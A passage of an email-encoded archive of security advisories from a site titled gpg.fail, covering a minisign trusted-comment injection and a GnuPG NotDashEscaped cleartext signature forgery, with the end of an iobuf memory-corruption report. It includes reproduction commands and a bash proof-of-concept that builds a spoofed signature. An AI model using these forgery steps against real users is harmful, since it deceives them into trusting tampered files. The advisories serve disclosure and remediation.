[afx->buffer_pos++];</span></span>
<span class=3D"line"><span>1: n =3D 4</span></span>
<span class=3D"line"><span>(gdb) </span></span></code></pre><!----> <h2>Rec=
ommendation</h2> <p>Aside from fixing the obvious demonstrated vulnerabilit=
y, the core issue here should be addressed: Much of the memory safety relat=
ed code makes assumptions about the state of the program, but does not asse=
rt them.</p> <p>This vulnerability demonstrates one source for state corrup=
tion, and shows several exploitation sink examples, but those are just conc=
rete examples; the codebase, especially iobuf code and iobuf consumers, hav=
e several similar suspicious state assumptions, with some being (incorrectl=
y) documented as correct, and some not even explicitly documented, yet no a=
ctual assertion happens. State corruption propagates easily and cascades fa=
r through the code, often because the code assumes that the rest of the cod=
e is bug-free, but as demonstrated above real bugs can happen and propagate=
. In the case of the iobuf system, both filters/iobuf itself and consumers =
of the iobuf API should have defense-in-depth assertions that the critical =
assumptions hold.</p><!----></article><!----><!----></main> <footer class=
=3D"bg-blue-500 p-4">contact: <a href=3D"/cdn-cgi/l/email-protection" class=
=3D"__cf_email__" data-cfemail=3D"0665696872676572466176612860676f6a">[emai=
l&#160;protected]</a></footer><!----><!--]--> <!--[!--><!--]--><!--]--><scr=
ipt data-cfasync=3D"false" src=3D"/cdn-cgi/scripts/5c5dd728/cloudflare-stat=
ic/email-decode.min.js"></script></body>
</html>

--1yeeQ81UyVL57Vl7
Content-Type: text/html; charset=utf-8
Content-Disposition: attachment; filename="06-minisign.html"
Content-Transfer-Encoding: quoted-printable

<!doctype html>
<html lang=3D"en">
	<head>
		<meta charset=3D"utf-8" />
		<meta name=3D"darkreader-lock" />
		<meta name=3D"viewport" content=3D"width=3Ddevice-width, initial-scale=3D=
1" />
		<link rel=3D"manifest" href=3D"/manifest.webmanifest">
        <link rel=3D"icon" href=3D"/favicon.ico" sizes=3D"32x32">
        <link rel=3D"icon" href=3D"/icon.svg" type=3D"image/svg+xml">
        <link rel=3D"apple-touch-icon" href=3D"/apple-touch-icon.png">
=09=09
		<link href=3D"./_app/immutable/assets/0.B3PCwX-h.css" rel=3D"stylesheet">=
<!--12qhfyh--><!----><title>gpg.fail</title>
	</head>
	<body><!--[--><!--[--><!----><main class=3D"min-w-full max-w-[1280px] my-a=
uto bg-green-500 p-4 space-y-4"><!----><article class=3D"prose mx-auto"><h1=
>Trusted comment injection (minisign)</h1> <!----><p>A vulnerability in <em=
>minisign</em> allows attackers to modify a signature in a way that could d=
eceive users about the content of a trusted comment.</p> <h2>Impact</h2> <p=
>A <em>minisign</em> signature file can be modified in a way that it still =
verifies, but the trusted comment appears to be extended, when displayed th=
rough most text viewing programs, though not <em>minisign</em> itself.</p> =
<h2>Details</h2> <p>To parse and load a <em>minisign</em> signature file (<=
code>.minisig</code>), <em>minisign</em> implements a function <code>sig_lo=
ad</code>. It <code>fgets</code> the trusted comment and calls a function <=
code>trim</code> with the contents of the line.</p> <!----><pre class=3D"sh=
iki github-dark-default" style=3D"background-color:#0d1117;color:#e6edf3" t=
abindex=3D"0"><code><span class=3D"line"><span style=3D"color:#FF7B72">    =
if</span><span style=3D"color:#E6EDF3"> (</span><span style=3D"color:#D2A8F=
F">fgets</span><span style=3D"color:#E6EDF3">(trusted_comment, (</span><spa=
n style=3D"color:#FF7B72">int</span><span style=3D"color:#E6EDF3">) </span>=
<span style=3D"color:#FFA657">trusted_comment_maxlen</span><span style=3D"c=
olor:#E6EDF3">, fp) </span><span style=3D"color:#FF7B72">=3D=3D</span><span=
 style=3D"color:#79C0FF"> NULL</span><span style=3D"color:#E6EDF3">) &#123;=
</span></span>
<span class=3D"line"><span style=3D"color:#D2A8FF">        exit_msg</span><=
span style=3D"color:#E6EDF3">(</span><span style=3D"color:#A5D6FF">"Trusted=
 comment not present"</span><span style=3D"color:#E6EDF3">);</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">    &#125;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    if</span><span style=
=3D"color:#E6EDF3"> (</span><span style=3D"color:#D2A8FF">strncmp</span><sp=
an style=3D"color:#E6EDF3">(trusted_comment, TRUSTED_COMMENT_PREFIX, (</spa=
n><span style=3D"color:#FF7B72">sizeof</span><span style=3D"color:#E6EDF3">=
 TRUSTED_COMMENT_PREFIX) </span><span style=3D"color:#FF7B72">-</span><span=
 style=3D"color:#79C0FF"> 1</span><span style=3D"color:#FF7B72">U</span><sp=
an style=3D"color:#E6EDF3">) </span><span style=3D"color:#FF7B72">!=3D</spa=
n></span>
<span class=3D"line"><span style=3D"color:#79C0FF">        0</span><span st=
yle=3D"color:#E6EDF3">) &#123;</span></span>
<span class=3D"line"><span style=3D"color:#D2A8FF">        exit_msg</span><=
span style=3D"color:#E6EDF3">(</span></span>
<span class=3D"line"><span style=3D"color:#A5D6FF">            "Trusted sig=
nature comment should start with "</span></span>
<span class=3D"line"><span style=3D"color:#A5D6FF">            "</span><spa=
n style=3D"color:#FF7B72">\</span><span style=3D"color:#A5D6FF">"" TRUSTED_=
COMMENT_PREFIX "</span><span style=3D"color:#E6EDF3">\</span><span style=3D=
"color:#A5D6FF">""</span><span style=3D"color:#E6EDF3">);</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">    &#125;</span></span>
<span class=3D"line"><span style=3D"color:#D2A8FF">    memmove</span><span =
style=3D"color:#E6EDF3">(trusted_comment,</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">            trusted_comm=
ent </span><span style=3D"color:#FF7B72">+</span><span style=3D"color:#FF7B=
72"> sizeof</span><span style=3D"color:#E6EDF3"> TRUSTED_COMMENT_PREFIX </s=
pan><span style=3D"color:#FF7B72">-</span><span style=3D"color:#79C0FF"> 1<=
/span><span style=3D"color:#FF7B72">U</span><span style=3D"color:#E6EDF3">,=
</span></span>
<span class=3D"line"><span style=3D"color:#D2A8FF">            strlen</span=
><span style=3D"color:#E6EDF3">(trusted_comment </span><span style=3D"color=
:#FF7B72">+</span><span style=3D"color:#FF7B72"> sizeof</span><span style=
=3D"color:#E6EDF3"> TRUSTED_COMMENT_PREFIX </span><span style=3D"color:#FF7=
B72">-</span><span style=3D"color:#79C0FF"> 1</span><span style=3D"color:#F=
F7B72">U</span><span style=3D"color:#E6EDF3">) </span><span style=3D"color:=
#FF7B72">+</span><span style=3D"color:#79C0FF"> 1</span><span style=3D"colo=
r:#FF7B72">U</span><span style=3D"color:#E6EDF3">);</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    if</span><span style=
=3D"color:#E6EDF3"> (</span><span style=3D"color:#D2A8FF">trim</span><span =
style=3D"color:#E6EDF3">(trusted_comment) </span><span style=3D"color:#FF7B=
72">=3D=3D</span><span style=3D"color:#79C0FF"> 0</span><span style=3D"colo=
r:#E6EDF3">) &#123;</span></span>
<span class=3D"line"><span style=3D"color:#D2A8FF">        exit_msg</span><=
span style=3D"color:#E6EDF3">(</span><span style=3D"color:#A5D6FF">"Trusted=
 comment too long"</span><span style=3D"color:#E6EDF3">);</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">    &#125;</span></span>
<span class=3D"line"></span></code></pre><!----> <p><code>fgets</code> is</=
p> <blockquote><p>Reading stops after an EOF or a newline.  If a newline is=
 read,
As such, it skips over =E2=80=98\r=E2=80=99 characters.
trim replaces all occurrences of =E2=80=98\n=E2=80=99 and =E2=80=98\r=E2=80=
=99 characters with null bytes.
Therefore, =E2=80=98\r=E2=80=99 characters can occur in the middle of the t=
rusted comment.</p></blockquote> <!----><pre class=3D"shiki github-dark-def=
ault" style=3D"background-color:#0d1117;color:#e6edf3" tabindex=3D"0"><code=
><span class=3D"line"><span style=3D"color:#FF7B72">int</span></span>
<span class=3D"line"><span style=3D"color:#D2A8FF">trim</span><span style=
=3D"color:#E6EDF3">(</span><span style=3D"color:#FF7B72">char</span><span s=
tyle=3D"color:#FF7B72"> *</span><span style=3D"color:#FFA657">str</span><sp=
an style=3D"color:#E6EDF3">)</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">&#123;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    size_t</span><span s=
tyle=3D"color:#E6EDF3"> i </span><span style=3D"color:#FF7B72">=3D</span><s=
pan style=3D"color:#D2A8FF"> strlen</span><span style=3D"color:#E6EDF3">(st=
r);</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    int</span><span styl=
e=3D"color:#E6EDF3">    t </span><span style=3D"color:#FF7B72">=3D</span><s=
pan style=3D"color:#79C0FF"> 0</span><span style=3D"color:#E6EDF3">;</span>=
</span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    while</span><span st=
yle=3D"color:#E6EDF3"> (i</span><span style=3D"color:#FF7B72">--</span><spa=
n style=3D"color:#FF7B72"> ></span><span style=3D"color:#E6EDF3"> (</span><=
span style=3D"color:#FF7B72">size_t</span><span style=3D"color:#E6EDF3">) <=
/span><span style=3D"color:#79C0FF">0</span><span style=3D"color:#FF7B72">U=
</span><span style=3D"color:#E6EDF3">) &#123;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">        if</span><span s=
tyle=3D"color:#E6EDF3"> (</span><span style=3D"color:#FFA657">str</span><sp=
an style=3D"color:#E6EDF3">[i] </span><span style=3D"color:#FF7B72">=3D=3D<=
/span><span style=3D"color:#A5D6FF"> '</span><span style=3D"color:#FF7B72">=
\</span><span style=3D"color:#A5D6FF">n'</span><span style=3D"color:#E6EDF3=
">) &#123;</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">            str</span><s=
pan style=3D"color:#E6EDF3">[i] </span><span style=3D"color:#FF7B72">=3D</s=
pan><span style=3D"color:#79C0FF"> 0</span><span style=3D"color:#E6EDF3">;<=
/span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">            t      </spa=
n><span style=3D"color:#FF7B72">=3D</span><span style=3D"color:#79C0FF"> 1<=
/span><span style=3D"color:#E6EDF3">;</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">        &#125; </span><s=
pan style=3D"color:#FF7B72">else</span><span style=3D"color:#FF7B72"> if</s=
pan><span style=3D"color:#E6EDF3"> (</span><span style=3D"color:#FFA657">st=
r</span><span style=3D"color:#E6EDF3">[i] </span><span style=3D"color:#FF7B=
72">=3D=3D</span><span style=3D"color:#A5D6FF"> '</span><span style=3D"colo=
r:#FF7B72">\</span><span style=3D"color:#A5D6FF">r'</span><span style=3D"co=
lor:#E6EDF3">) &#123;</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">            str</span><s=
pan style=3D"color:#E6EDF3">[i] </span><span style=3D"color:#FF7B72">=3D</s=
pan><span style=3D"color:#79C0FF"> 0</span><span style=3D"color:#E6EDF3">;<=
/span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">        &#125;</span></s=
pan>
<span class=3D"line"><span style=3D"color:#E6EDF3">    &#125;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    return</span><span s=
tyle=3D"color:#E6EDF3"> t;</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">&#125;</span></span>
<span class=3D"line"></span></code></pre><!----> <p>The premature null byte=
 termination later leads to only the part before the (first) =E2=80=98\r=E2=
=80=99 being hashed and contributing to the signed content during verificat=
ion.</p> <!----><pre class=3D"shiki github-dark-default" style=3D"backgroun=
d-color:#0d1117;color:#e6edf3" tabindex=3D"0"><code><span class=3D"line"><s=
pan>    trusted_comment_len     =3D strlen(trusted_comment);</span></span>
<span class=3D"line"><span>    sig_and_trusted_comment =3D xmalloc((sizeof =
sig_struct->sig) + trusted_comment_len);</span></span>
<span class=3D"line"><span>    memcpy(sig_and_trusted_comment, sig_struct->=
sig, sizeof sig_struct->sig);</span></span>
<span class=3D"line"><span>    memcpy(sig_and_trusted_comment + sizeof sig_=
struct->sig, trusted_comment, trusted_comment_len);</span></span>
<span class=3D"line"><span></span></span></code></pre><!----> <p>Therefore,=
 an attacker can extend a <code>.minisig</code> file with a =E2=80=98\r=E2=
=80=99 character followed by any text, as long as it doesn=E2=80=99t contai=
n a null byte</p> <h3>Scenario</h3> <p>Alice wants to send Bob a message.
Over a trusted channel, she obtained and verified Bob=E2=80=99s public key.
Mallory is an able to intercept and manipulate communications between Alice=
 and Bob.
Mallory=E2=80=99s goal is to manipulate the trusted comment of the signatur=
e that Alice sings her trusted message to Bob with.</p> <h3>Detailed steps =
to reproduce</h3> <p>Alice creates a keypair.</p> <!----><pre class=3D"shik=
i github-dark-default" style=3D"background-color:#0d1117;color:#e6edf3" tab=
index=3D"0"><code><span class=3D"line"><span>minisign -G -W -p pubkey.txt -=
s seckey.txt &#x3C;&#x3C;&#x3C;'<a href=3D"/cdn-cgi/l/email-protection" cla=
ss=3D"__cf_email__" data-cfemail=3D"21434d4061434d54430f484f57404d4845">[em=
ail&#160;protected]</a>'</span></span>
<span class=3D"line"><span></span></span></code></pre><!----> <p><em>Alice =
securely transmit pubkey.txt to Bob.</em></p> <p>Alice writes a message an =
signs it adding a trusted comment.</p> <!----><pre class=3D"shiki github-da=
rk-default" style=3D"background-color:#0d1117;color:#e6edf3" tabindex=3D"0"=
><code><span class=3D"line"><span>echo "Hello World" > msg.txt</span></span>
<span class=3D"line"><span>minisign -S -s seckey.txt -m msg.txt -t "My trus=
ted comment"</span></span>
<span class=3D"line"><span></span></span></code></pre><!----> <p><em>Alice =
sends the message over an insecure channel with Bob.</em> Mallory manipulat=
es the signature file.</p> <!----><pre class=3D"shiki github-dark-default" =
style=3D"background-color:#0d1117;color:#e6edf3" tabindex=3D"0"><code><span=
 class=3D"line"><span>cat msg.txt.minisig | sed 's/My trusted comment/My tr=
usted comment&#92;rtrusted comment: Another comment (that is longer)/' > ms=
g.txt.minisig</span></span>
<span class=3D"line"><span></span></span></code></pre><!----> <p><em>Bob ve=
rifies and views the signature</em></p> <!----><pre class=3D"shiki github-d=
ark-default" style=3D"background-color:#0d1117;color:#e6edf3" tabindex=3D"0=
"><code><span class=3D"line"><span>$ minisign -V -p pubkey1.txt -m msg1.txt=
 -x msg2.txt.minisig</span></span>
<span class=3D"line"><span>Signature and comment signature verified</span><=
/span>
<span class=3D"line"><span>Trusted comment: My trusted comment</span></span>
<span class=3D"line"><span>$ cat msg.txt.minisig</span></span>
<span class=3D"line"><span>untrusted comment: signature from minisign secre=
t key</span></span>
<span class=3D"line"><span>RUSxMpCG+YFr0SRuYCpobKKB63izdUb7DqzC6TnSZOeun/nn=
aW+1dGTMFTbK7BxAy9NrSkUJ1/gRWovtqyE+nK1VJG5PgjE3BgU=3D</span></span>
<span class=3D"line"><span>trusted comment: Another comment (that is longer=
)</span></span>
<span class=3D"line"><span>h5+qWjFYrr4OawWiTyj/3g2LMcNmGsIpyzSe8SNFvzd0VhPi=
KQCvNzAyaBr9jO+QM87y5nAAZsK0k5dQ3YwuCA=3D=3D</span></span>
<span class=3D"line"><span></span></span></code></pre><!----> <p>He might o=
nly look at the output of cat vs the output of <em>minisign</em>.</p><!----=
></article><!----><!----></main> <footer class=3D"bg-blue-500 p-4">contact:=
 <a href=3D"/cdn-cgi/l/email-protection" class=3D"__cf_email__" data-cfemai=
l=3D"7615191802171502361106115810171f1a">[email&#160;protected]</a></footer=
><!----><!--]--> <!--[!--><!--]--><!--]--><script data-cfasync=3D"false" sr=
c=3D"/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></scr=
ipt></body>
</html>

--1yeeQ81UyVL57Vl7
Content-Type: text/html; charset=utf-8
Content-Disposition: attachment; filename="07-notdash.html"
Content-Transfer-Encoding: quoted-printable

<!doctype html>
<html lang=3D"en">
	<head>
		<meta charset=3D"utf-8" />
		<meta name=3D"darkreader-lock" />
		<meta name=3D"viewport" content=3D"width=3Ddevice-width, initial-scale=3D=
1" />
		<link rel=3D"manifest" href=3D"/manifest.webmanifest">
        <link rel=3D"icon" href=3D"/favicon.ico" sizes=3D"32x32">
        <link rel=3D"icon" href=3D"/icon.svg" type=3D"image/svg+xml">
        <link rel=3D"apple-touch-icon" href=3D"/apple-touch-icon.png">
=09=09
		<link href=3D"./_app/immutable/assets/0.B3PCwX-h.css" rel=3D"stylesheet">=
<!--12qhfyh--><!----><title>gpg.fail</title>
	</head>
	<body><!--[--><!--[--><!----><main class=3D"min-w-full max-w-[1280px] my-a=
uto bg-green-500 p-4 space-y-4"><!----><article class=3D"prose mx-auto"><h1=
>Cleartext Signature Forgery in the NotDashEscaped header implementation in=
 GnuPG</h1> <!----><p>A vulnerability in <em>GnuPG</em> allows stuffing add=
itional data in the Cleartext Signature Framework.</p> <h2>Impact</h2> <p>E=
xploitation allows appending additional data after a valid <code>BEGIN PGP =
SIGNED MESSAGE</code> <a href=3D"https://www.rfc-editor.org/rfc/rfc9580.htm=
l#name-armor-header-line" rel=3D"nofollow">Armor Header Line</a> and thereb=
y potentially deceiving a <em>GnuPG</em> user about the actual signed data =
while preserving cryptographic integrity.
This is possible for any</p> <ul><li>Cleartext signature that was generated=
 using <code>--not-dash-escaped</code></li> <li>Detached signature, by conv=
erting it into a cleartext signature</li></ul> <h2>Details</h2> <p><em>GnuP=
G</em> supports a command line flag <code>--not-dash-escaped</code>.
It was <a href=3D"https://github.com/gpg/gnupg/blob/be77c0553203fa7f0de4a6d=
b9a33fbd7d099f591/g10/ChangeLog-2011#L10745-L10749" rel=3D"nofollow">introd=
uced</a> to generate cleartext signatures of messages that have leading das=
hes <code>-</code>, such as patch files.
To support this, <em>GnuPG</em> decided to diverge from the <a href=3D"http=
s://datatracker.ietf.org/doc/html/rfc2440#section-7" rel=3D"nofollow">RFC s=
pecification</a>, and introduce a new header named =E2=80=9CNotDashEscaped=
=E2=80=9D.
Furthermore, modern versions of the RFC <a href=3D"https://www.rfc-editor.o=
rg/rfc/rfc9580.html#section-7.1-5" rel=3D"nofollow">explicitly state</a>:</=
p> <blockquote><p>Between the -----BEGIN PGP SIGNED MESSAGE----- line and t=
he first empty line, the only Armor Header permitted is a well-formed Hash =
Armor Header (see Section 6.2.2.3). To reduce the risk of confusion about w=
hat has been signed, a verifying implementation MUST decline to validate an=
y signature in a cleartext message if that message has any other Armor Head=
er present in this location.</p></blockquote> <p>When clearsigning a messag=
e with <code>--not-dash-escaped</code> <em>GnuPG</em> adds this line to the=
 header.</p> <!----><pre class=3D"shiki github-dark-default" style=3D"backg=
round-color:#0d1117;color:#e6edf3" tabindex=3D"0"><code><span class=3D"line=
"><span style=3D"color:#FF7B72">  if</span><span style=3D"color:#E6EDF3"> (=
opt.not_dash_escaped)</span></span>
<span class=3D"line"><span style=3D"color:#D2A8FF">    iobuf_writestr</span=
><span style=3D"color:#E6EDF3"> (out,</span></span>
<span class=3D"line"><span style=3D"color:#A5D6FF">                    "Not=
DashEscaped: You need "</span><span style=3D"color:#E6EDF3">GPG_NAME</span>=
</span>
<span class=3D"line"><span style=3D"color:#A5D6FF">                    " to=
 verify this message"</span><span style=3D"color:#E6EDF3"> LF);</span></spa=
n></code></pre><!----> <p>Where <code>GPG_NAME</code> varries between versi=
ons.</p> <p>Crucially, the header line itself does <strong>not</strong> con=
tribute to the signature.</p> <p>Verification header line parsing accepts a=
ny non-empty sequence of characters following =E2=80=98NotDashEscaped:=E2=
=80=99 up to the first \n=E2=80=99 character.</p> <!----><pre class=3D"shik=
i github-dark-default" style=3D"background-color:#0d1117;color:#e6edf3" tab=
index=3D"0"><code><span class=3D"line"><span style=3D"color:#FF7B72">	if</s=
pan><span style=3D"color:#E6EDF3">( (hashes</span><span style=3D"color:#FF7=
B72">=3D</span><span style=3D"color:#D2A8FF">parse_hash_header</span><span =
style=3D"color:#E6EDF3">( line )) )</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">	  afx</span><span style=
=3D"color:#FF7B72">-></span><span style=3D"color:#E6EDF3">hashes </span><sp=
an style=3D"color:#FF7B72">|=3D</span><span style=3D"color:#E6EDF3"> hashes=
;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">	else</span><span style=
=3D"color:#FF7B72"> if</span><span style=3D"color:#E6EDF3">( </span><span s=
tyle=3D"color:#D2A8FF">strlen</span><span style=3D"color:#E6EDF3">(line) </=
span><span style=3D"color:#FF7B72">></span><span style=3D"color:#79C0FF"> 1=
5</span><span style=3D"color:#FF7B72"> &#x26;&#x26;</span><span style=3D"co=
lor:#FF7B72"> !</span><span style=3D"color:#D2A8FF">memcmp</span><span styl=
e=3D"color:#E6EDF3">( line, </span><span style=3D"color:#A5D6FF">"NotDashEs=
caped:"</span><span style=3D"color:#E6EDF3">, </span><span style=3D"color:#=
79C0FF">15</span><span style=3D"color:#E6EDF3"> ) )</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">	  afx</span><span style=
=3D"color:#FF7B72">-></span><span style=3D"color:#E6EDF3">not_dash_escaped =
</span><span style=3D"color:#FF7B72">=3D</span><span style=3D"color:#79C0FF=
"> 1</span><span style=3D"color:#E6EDF3">;</span></span></code></pre><!----=
> <p>By doing so, <em>GnuPG</em> disregards the security warning in their o=
wn comment above <code>parse_hash_header</code> and warnings in the RFC.</p=
> <!----><pre class=3D"shiki github-dark-default" style=3D"background-color=
:#0d1117;color:#e6edf3" tabindex=3D"0"><code><span class=3D"line"><span sty=
le=3D"color:#8B949E">/****************</span></span>
<span class=3D"line"><span style=3D"color:#8B949E"> * check whether the arm=
or header is valid on a signed message.</span></span>
<span class=3D"line"><span style=3D"color:#8B949E"> * this is for security =
reasons: the header lines are not included in the</span></span>
<span class=3D"line"><span style=3D"color:#8B949E"> * hash and by using som=
e creative formatting rules, Mallory could fake</span></span>
<span class=3D"line"><span style=3D"color:#8B949E"> * any text at the begin=
ning of a document; assuming it is read with</span></span>
<span class=3D"line"><span style=3D"color:#8B949E"> * a simple viewer. We o=
nly allow the Hash Header.</span></span>
<span class=3D"line"><span style=3D"color:#8B949E"> */</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">static</span><span style=
=3D"color:#FF7B72"> int</span></span>
<span class=3D"line"><span style=3D"color:#D2A8FF">parse_hash_header</span>=
<span style=3D"color:#E6EDF3">( </span><span style=3D"color:#FF7B72">const<=
/span><span style=3D"color:#FF7B72"> char</span><span style=3D"color:#FF7B7=
2"> *</span><span style=3D"color:#FFA657">line</span><span style=3D"color:#=
E6EDF3"> )</span></span></code></pre><!----> <h2>Detailed steps to reproduc=
e</h2> <p>Bob wants to download and verify an Arch Linux ISO.
Over a trusted channel, he obtained the <a href=3D"https://gitlab.archlinux=
.org/archlinux/arch-boxes" rel=3D"nofollow">release signing key</a> of the =
project via a trusted channel.
He imports and trust it.
Over an untrusted channel, on which Mallory has an MITM role, Bob proceeds =
to download the ISO file alongside the cryptographic signatures.
Mallory converts the detached signature to a cleartext signature, and adds =
a NotDashEscaped, alongside non-standard line breaks.
Having the hash of his download be part of the signed texts, Bob trusts and=
 runs the malicous ISO.</p> <!----><pre class=3D"shiki github-dark-default"=
 style=3D"background-color:#0d1117;color:#e6edf3" tabindex=3D"0"><code><spa=
n class=3D"line"><span style=3D"color:#8B949E">#!/usr/bin/env bash</span></=
span>
<span class=3D"line"><span style=3D"color:#8B949E"># needs curl, gpg, sq (s=
equoia-sq)</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">FILE</span><span style=
=3D"color:#FF7B72">=3D</span><span style=3D"color:#E6EDF3">$(</span><span s=
tyle=3D"color:#FFA657">curl</span><span style=3D"color:#79C0FF"> -s</span><=
span style=3D"color:#A5D6FF"> https://mirrors.sonic.net/archlinux/images/la=
test/</span><span style=3D"color:#FF7B72"> |</span><span style=3D"color:#FF=
A657"> sed</span><span style=3D"color:#79C0FF"> -E</span><span style=3D"col=
or:#A5D6FF"> 's%.*href=3D"(.*cloudimg-.*qcow2)".*|.*%\1%'</span><span style=
=3D"color:#FF7B72"> |</span><span style=3D"color:#FFA657"> xargs</span><spa=
n style=3D"color:#E6EDF3">)</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">curl</span><span style=
=3D"color:#79C0FF"> -sO</span><span style=3D"color:#A5D6FF"> https://mirror=
s.sonic.net/archlinux/images/latest/</span><span style=3D"color:#E6EDF3">$F=
ILE</span><span style=3D"color:#A5D6FF">.SHA256</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">curl</span><span style=
=3D"color:#79C0FF"> -sO</span><span style=3D"color:#A5D6FF"> https://mirror=
s.sonic.net/archlinux/images/latest/</span><span style=3D"color:#E6EDF3">$F=
ILE</span><span style=3D"color:#A5D6FF">.SHA256.sig</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#79C0FF">echo</span><span style=
=3D"color:#A5D6FF"> malicious</span><span style=3D"color:#FF7B72"> ></span>=
<span style=3D"color:#E6EDF3"> $&#123;FILE</span><span style=3D"color:#FF7B=
72">/</span><span style=3D"color:#E6EDF3">cloudimg</span><span style=3D"col=
or:#FF7B72">/</span><span style=3D"color:#E6EDF3">basic&#125;</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">(</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">cat</span><span style=3D=
"color:#FF7B72"> &#x3C;&#x3C;</span><span style=3D"color:#E6EDF3">EOF</span=
></span>
<span class=3D"line"><span style=3D"color:#A5D6FF">-----BEGIN PGP SIGNED ME=
SSAGE-----</span></span>
<span class=3D"line"><span style=3D"color:#A5D6FF">Hash: SHA512</span></spa=
n>
<span class=3D"line"><span style=3D"color:#A5D6FF">NotDashEscaped: true%i</=
span></span>
<span class=3D"line"><span style=3D"color:#A5D6FF">%</span></span>
<span class=3D"line"><span style=3D"color:#A5D6FF">$(</span><span style=3D"=
color:#FFA657">sha256sum</span><span style=3D"color:#A5D6FF"> $&#123;</span=
><span style=3D"color:#E6EDF3">FILE</span><span style=3D"color:#FF7B72">/</=
span><span style=3D"color:#E6EDF3">cloudimg</span><span style=3D"color:#FF7=
B72">/</span><span style=3D"color:#E6EDF3">basic</span><span style=3D"color=
:#A5D6FF">&#125;)</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#A5D6FF">$(</span><span style=3D"=
color:#FFA657">cat</span><span style=3D"color:#79C0FF"> *</span><span style=
=3D"color:#A5D6FF">.SHA256)</span></span>
<span class=3D"line"><span style=3D"color:#A5D6FF">$(</span><span style=3D"=
color:#FFA657">cat</span><span style=3D"color:#79C0FF"> *</span><span style=
=3D"color:#A5D6FF">.SHA256.sig </span><span style=3D"color:#FF7B72">|</span=
><span style=3D"color:#FFA657"> sq</span><span style=3D"color:#A5D6FF"> pac=
ket join)</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">EOF</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">) </span><span style=3D"=
color:#FF7B72">|</span><span style=3D"color:#FFA657"> sed</span><span style=
=3D"color:#79C0FF"> -z</span><span style=3D"color:#A5D6FF"> 's/%i/%0%v%v%r%=
r%/g;s/%0/=00/g;s/%&#92;n//g;s/%v/=0B/g;s/%r/&#92;r/g'</span><span style=3D=
"color:#FF7B72"> |</span><span style=3D"color:#FFA657"> tee</span><span sty=
le=3D"color:#A5D6FF"> spoofed.sig</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">curl</span><span style=
=3D"color:#79C0FF"> -s</span><span style=3D"color:#A5D6FF"> https://gitlab.=
archlinux.org/archlinux/arch-boxes/-/raw/master/README.md</span><span style=
=3D"color:#FF7B72"> |</span><span style=3D"color:#FFA657"> gpg</span><span =
style=3D"color:#79C0FF"> --import</span><span style=3D"color:#FF7B72"> 2></=
span><span style=3D"color:#A5D6FF">/dev/null</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">gpg</span><span style=3D=
"color:#79C0FF"> --verify</span><span style=3D"color:#A5D6FF"> spoofed.sig<=
/span></span></code></pre><!----> <h2>Discussion</h2> <p>Due to <em>GnuPG</=
em> handling <a href=3D"https://github.com/gpg/gnupg/blob/b1857a2836c9a91ef=
4e359ef7ba949b54c77219d/g10/armor.c#L754-L784" rel=3D"nofollow">end-of-line=
 canonicalization</a> differently when used with <code>--not-dash-escaped</=
code> not all clearsigned messages can be stuffed by just adding the header=
 + injected text. However, practical exploitation scenarios include, but ar=
e not necessary limited to, (1) converting a detached signature into a clea=
rtext signature or (2) modifying a cleartext signature that already contain=
s the =E2=80=9CNotDashEscaped=E2=80=9D header.
There is an additional constraint of the injected text not pros an =E2=80=
=98\n=E2=80=99 character.
Therefore, when parsing a mallicious file with a 3rd party downstream tool,=
 such as some implementations of the sha512sum utility, it may catch the in=
jection.</p> <h2>Recommendation</h2> <p>Removal of the Cleartext Signature =
Framework from the <em>OpenPGP</em> standard helps resolve the <a href=3D"h=
ttps://www.rfc-editor.org/rfc/rfc9580.html#name-issues-with-the-cleartext-s=
" rel=3D"nofollow">issues with the Cleartext Signature Framework</a>. Furth=
ermore, deprecation allows for a graceful phase-out.</p> <p><em>OpenPGP</em=
> users should avoid using cleartext signatures, as is also recommended by =
<em>GnuPG</em>.</p> <p><em>GnuPG</em> should implement the signature valida=
tion constraints from the RFC to mitigate the <a href=3D"https://www.rfc-ed=
itor.org/rfc/rfc9580.html#name-issues-with-the-cleartext-s" rel=3D"nofollow=
">issues with the Cleartext Signature Framework</a>.</p> <p>To prevent conf=
usion about the actual signed data, <em>OpenPGP</em> implementations should=
 output the data bound by the signature during validation by default. <em>s=
equoia-sq</em> does so. <em>GnuPG</em> does not and requires the <code>--ou=
tput</code> option to be set.</p> <p>When working with <em>OpenPGP</em> sig=
natures in general, users should instruct their PGP implementation to outpu=
t the signed data and only use this output for any further or related tasks=
.</p><!----></article><!----><!----></main> <footer class=3D"bg-blue-500 p-=
4">contact: <a href=3D"/cdn-cgi/l/email-protection" class=3D"__cf_email__" =
data-cfemail=3D"70131f1e04111304301700175e1611191c">[email&#160;protected]<=
